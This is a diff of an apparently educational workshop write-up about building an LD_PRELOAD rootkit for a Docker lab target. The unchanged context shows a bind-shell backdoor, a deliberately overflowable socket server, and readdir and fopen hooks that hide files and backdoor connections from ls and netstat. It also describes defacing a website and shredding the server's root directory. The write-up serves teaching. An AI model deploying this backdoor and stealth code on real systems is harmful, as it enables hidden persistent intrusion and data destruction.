@@ -68,8 +68,8 @@ An example of an operating system service is file manipulation since the filesys
 
 int main(int argc, char** argv)
 {
-    printf("Hello World\n");
-    return 0;
+	printf("Hello World\n");
+	return 0;
 }
 ```
 
@@ -77,18 +77,18 @@ This program uses the `printf` function from `<stdio.h>`, to write `"Hello World
 
 ```s
 0000000000001149 <main>:
-    1149:	f3 0f 1e fa          	endbr64 
-    114d:	55                   	push   rbp
-    114e:	48 89 e5             	mov    rbp,rsp
-    1151:	48 83 ec 10          	sub    rsp,0x10
-    1155:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
-    1158:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
-    115c:	48 8d 05 a1 0e 00 00 	lea    rax,[rip+0xea1]        # 2004 <_IO_stdin_used+0x4>
-    1163:	48 89 c7             	mov    rdi,rax
-    1166:	e8 e5 fe ff ff       	call   1050 <puts@plt>
-    116b:	b8 00 00 00 00       	mov    eax,0x0
-    1170:	c9                   	leave  
-    1171:	c3                   	ret
+	1149:	f3 0f 1e fa          	endbr64 
+	114d:	55                   	push   rbp
+	114e:	48 89 e5             	mov    rbp,rsp
+	1151:	48 83 ec 10          	sub    rsp,0x10
+	1155:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
+	1158:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
+	115c:	48 8d 05 a1 0e 00 00 	lea    rax,[rip+0xea1]        # 2004 <_IO_stdin_used+0x4>
+	1163:	48 89 c7             	mov    rdi,rax
+	1166:	e8 e5 fe ff ff       	call   1050 <puts@plt>
+	116b:	b8 00 00 00 00       	mov    eax,0x0
+	1170:	c9                   	leave  
+	1171:	c3                   	ret
 ```
 
 In this case, it uses the `puts` system call (instruction at `0x1166`). This syscall simply takes a string as input and writes it to `stdout`.
@@ -144,8 +144,8 @@ Next, we compile this code into a shared library and put the path in the `/etc/l
 ```c
 int main()
 {
-    printf("cat");
-    return 0;
+	printf("cat");
+	return 0;
 }
 ```
 
@@ -238,8 +238,8 @@ void start_bind4()
 	int client_sockfd = accept(sockfd, NULL, NULL);
 	int pid = fork();
 	if (pid == 0) {
-	    for (int i = 0; i < 3; i++)
-		    dup2(client_sockfd, i);
+		for (int i = 0; i < 3; i++)
+			dup2(client_sockfd, i);
 
 		execve("/bin/bash", NULL, NULL);
 	}
@@ -273,6 +273,7 @@ I won't go too in-depth into the vulnerability or mechanics behind how buffer ov
 The target machine had a couple of characteristics. It was a web server hosting a static HTTP page via Apache on an Ubuntu system. Additionally, it was running sshd, and the vulnerable target program detailed in the next section.
 
 ![Website](imgs/website.png)
+
 The static webpage hosted is shown above.
 
 To configure and run this target machine we used docker to set up several target machines.
@@ -285,15 +286,15 @@ Here is the Dockerfile used to configure our machine.
 FROM ubuntu:jammy
 
 RUN apt-get update && \
-    apt-get -y dist-upgrade && \
-    apt-get -y install gcc && \
-    apt-get -y install make && \
-    apt-get -y install rsyslog && \
-    apt-get -y install vim && \
-    apt-get -y install python3 && \
-    apt-get -y install python3-pip && \
-    apt-get -y install apache2 sudo && \
-    apt-get -y install openssh-server sudo
+	apt-get -y dist-upgrade && \
+	apt-get -y install gcc && \
+	apt-get -y install make && \
+	apt-get -y install rsyslog && \
+	apt-get -y install vim && \
+	apt-get -y install python3 && \
+	apt-get -y install python3-pip && \
+	apt-get -y install apache2 sudo && \
+	apt-get -y install openssh-server sudo
 
 RUN pip install pwn
 
@@ -313,7 +314,7 @@ EXPOSE 2002
 CMD ["./start.sh"]
 ```
 
-Ideally, we would start all of our services in the `Dockerfile`, but doing so is not possible as we can't enable services until after the `Dockerfile` finishes running. This is in line with the philosophy that docker containers should only be running one real task each. However, we are trying to simulate a monolithic server in this case, so we can get around this by starting the services in `start.sh` instead.
+Ideally, we would start all of our services in the `Dockerfile`, but doing so is not possible as we can't enable services until after the `Dockerfile` finishes running. This is in line with the philosophy that docker containers should only be running one real task each. However, in this case, we are trying to simulate a monolithic server architecture so we can get around this by starting the services in our entry point script `start.sh` instead.
 
 ```sh
 #!/bin/sh
@@ -332,12 +333,12 @@ service apache2 start
 ./target
 ```
 
-> You might notice that we are running `rsyslog` as well. This is because docker containers actually have ssh logging indirectly disabled by default. Normally, logging is managed by the syslog service, however, this service is started by the init system, which isn't run in docker containers automatically. To get around this we have to start it manually. Additionally, we need to configure `rsyslogd` to run as root because it runs as the `rsyslog` user by default for security reasons.
+> You might notice that we are running `rsyslog` as well. This is because docker containers actually have ssh logging indirectly disabled by default. Normally, logging is managed by the syslog service, however, this service is started by the init system, which isn't run in docker containers automatically. To get around this we have to start it manually. Additionally, we need to configure `rsyslogd` to run as root because it runs as the `rsyslog` user by default for security reasons :'(.
 
 Given this setup, the object was to: 
 1. Hijack the target program
 2. Gain persistent access by installing the rootkit
-3. Modify the Website, or cause chaos
+3. Modify the static website
 
 ### Target Binary
 
@@ -364,69 +365,69 @@ volatile int client_sockfd;
 
 void interact()
 {
-    char out[264];
-    char in[256];
+	char out[264];
+	char in[256];
 
 	strcpy(out, "Enter your name: ");
 
-    send(client_sockfd, out, strlen(out), 0);
+	send(client_sockfd, out, strlen(out), 0);
 
 	/* BUFFER OVERFLOW OCCURS HERE */
-    recv(client_sockfd, in, 1024, 0);
+	recv(client_sockfd, in, 1024, 0);
 
-    strcpy(out, "Hello: ");
-    strcat(out, in);
+	strcpy(out, "Hello: ");
+	strcat(out, in);
 
-    send(client_sockfd, out, strlen(out), 0);
+	send(client_sockfd, out, strlen(out), 0);
 }
 
 /* Start server and redirect stdin and stdout to socket */
 int setup_server()
 {
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(LISTEN_PORT);
-    addr.sin_addr.s_addr = INADDR_ANY;
+	struct sockaddr_in addr;
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(LISTEN_PORT);
+	addr.sin_addr.s_addr = INADDR_ANY;
 
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    /* allow reuse of local address */
-    const static int optval = 1;
-    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+	/* allow reuse of local address */
+	const static int optval = 1;
+	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 
-    /* bind socket to local address */
-    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
-    listen(sockfd, 0);
+	/* bind socket to local address */
+	bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+	listen(sockfd, 0);
 
-    return sockfd;
+	return sockfd;
 }
 
 void sighandler(int sig)
 {
-    close(client_sockfd);
-    close(server_sockfd);
+	close(client_sockfd);
+	close(server_sockfd);
 }
 
 int main()
 {
-    signal(SIGINT, sighandler); // used for debugging purposes
-    server_sockfd = setup_server();
+	signal(SIGINT, sighandler); // used for debugging purposes
+	server_sockfd = setup_server();
 
-    struct sockaddr_in client_addr;
-    unsigned sin_size = 0;
+	struct sockaddr_in client_addr;
+	unsigned sin_size = 0;
 
-    while (true) {
-        client_sockfd = accept(server_sockfd, (struct sockaddr *) &client_addr, &sin_size); 
-        interact(); 
-        close(client_sockfd);     
-    }
+	while (true) {
+		client_sockfd = accept(server_sockfd, (struct sockaddr *) &client_addr, &sin_size); 
+		interact(); 
+		close(client_sockfd);     
+	}
 
-    return 0;
+	return 0;
 }
 
 ```
 
-As you can see this is a basic program that echos "Hello: *whatever they enter*" in a loop indefinitely. However, in the interact function, it allows the user to enter up to 1024 bytes into a 256-byte buffer. This is a classic buffer overflow.
+As you can see this is a basic program that listens on a socket and echos "Hello: *whatever they enter*" in a loop indefinitely. However, in the interact function, it allows the user to send up to 1024 bytes into a 256-byte buffer. This is a classic buffer overflow.
 
 ![target](imgs/target.png)
 
@@ -523,7 +524,7 @@ Our first group decided to directly expand upon the base rootkit by reading furt
 
 Hiding from `ls` is rather simple. For LS to function, it uses the `readdir` syscall to iterate through a directory. Given a pointer to a directory stream, the `readdir` syscall is meant to return the next directory entry in the directory. Calling it in a loop allows `ls` to iterate through a directory and list information about each file.
 
-However, our goal is to hide a file from ls. To do so, we can hook the `readdir` syscall, and then instruct it to skip over any file that we want. This way, as `ls` iterates through a directory, it will fail to see our malicious library.
+However, our goal was to hide a file from ls. To do so, we can hook the `readdir` syscall, and then instruct it to skip over the rootkit directory entry. This way, as `ls` iterates through a directory, it fails to detect our malicious library.
 
 ```c
 /* Hide from ls */
@@ -541,19 +542,19 @@ struct dirent *readdir(DIR *dirp) {
 }
 ```
 
-As you can see, our code just wraps the real `readdir` syscall, which gets the next directory entry. However, our code continues calling this function, until it finds a directory entry that doesn't contain our library name. This way, our library will be skipped by ls.
+As you can see, our code just wraps the real `readdir` syscall, which gets the next directory entry given a directory pointer. However, our code continues calling this function to get the next entry, until it finds one that doesn't contain our rootkit's filename. This way `ls`, and any other utility reading the contents of a directory, will skip over our rootkit.
 
 After including this in the rootkit, `ls` will work as normal, except that it will never output a trace of our `rootkit.so` file.
 
-> Note: using `ls -ld rootkit.so` will still work as it uses a different system call to gather information about the file. This was helpful because it allowed us to ensure that hiding from ls was actually working
+> Note: using `ls -ld rootkit.so` will still work as it uses a different system call to gather information about the file. This was helpful because it allowed us to ensure that the evasion feature was working.
 
 #### netstat
 
-Hiding from `netstat` is slightly more involved, however the approach is still pretty simple. `netstat` actually works by reading information from the special file `/proc/net/tcp` into a buffer and then formatting its information out to the terminal. This file is actually just a window into the operating system to gain information about active TCP connections.
+Hiding from `netstat` is slightly more involved, however the approach is still pretty simple. `netstat` works by reading information from the special file `/proc/net/tcp` into a buffer and then writing/formatting its contents out to the terminal. The file `/proc/net/tcp` is a proc file that acts as a window into the operating system to gain information about active TCP connections.
 
-Since `netstat`, has to read from this file, we can hook the `fopen` syscall used to read files and filter out evidence of our backdoor TCP connections before returning the information to the user.
+Since `netstat`, has to read from this file, we can hook the `fopen` syscall used to read this proc file and filter out evidence of our backdoor TCP connections before returning the its contents to the user.
 
-To achieve this, we can read each line from `/proc/net/tcp`, and write it out to a temporary file if it doesn't contain evidence of a backdoor. Then we just return a pointer to the temporary file, so that `netstat` will read from our clean dummy file as opposed to `/proc/net/tcp`.
+To achieve this, we read each line from `/proc/net/tcp`, and write it to a temporary file if it doesn't contain evidence of our backdoor (the port in this case). Then we just return a pointer to the temporary file, so that `netstat` will read from our clean dummy file as opposed to `/proc/net/tcp`.
 
 ```c
 /* Hide from netstat */
@@ -607,17 +608,20 @@ echo "body { background-color: red; }" > css/style.css
 ```
 
 After running these commands, the website went from this:
+
 ![before](imgs/website.png)
+
 to this:
+
 ![after](imgs/after.png)
 
 They completed this attack in front of a live audience to demonstrate the capabilities of a persistent root shell.
 
 ### Shred
 
-Finally, for our grand finale, our last team wanted to experiment a little bit and cause pure chaos. After modifying the website a bit more using javascript injection, they simply shredded the root directory of the server in front of a live audience to see what would happen.
+For our grand finale, our last team wanted to experiment a little bit to cause pure chaos. After modifying the website a bit more using javascript injection, they simply shredded the root directory of the server in front of a live audience to see what would happen.
 
-After some time, the website went down, and the terminal started going haywire as it couldn't even print status messages after libc was completely deleted. 
+After some time, the website went down, and the terminal went haywire as it couldn't even print status messages after libc was erased. 
 
 While somewhat of a joke, this attack does demonstrate the capabilities of our rootkit. With persistent root access, you can run literally any attack you want, from precise monitoring and spying to wiping the system clean altogether.
 
@@ -639,14 +643,14 @@ Namely:
 	- We were simulating a monolithic server with docker, which led to several problems
 * Exploiting a toy vulnerability was a bit out of the scope of this workshop. We probably should have used an old CVE + Msfvenom to simplify exploitation and provide more practical experience.
 
-If you are interested in learning more, I highly recommend the resources below.
+If you have any questions or want to learn more, I highly recommend the resources below.
 
 ## Resources
 
 ### Links
 * [Techincal Breakdown of similar LD_PRELOAD rootkit](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/).
 * [repo](https://github.com/RoryHemmings/cyber-rootkit-s23) 
-* [discord](https://discord.gg/j9dgf2q):
+* [discord](https://discord.gg/j9dgf2q)
 
 ### Slides:
 * [week 1](https://docs.google.com/presentation/d/1EFRjWrZO-xo2kFhywVZy9M7Y5B-amZuXKzCrS-XNfLQ/edit?usp=drive_link)
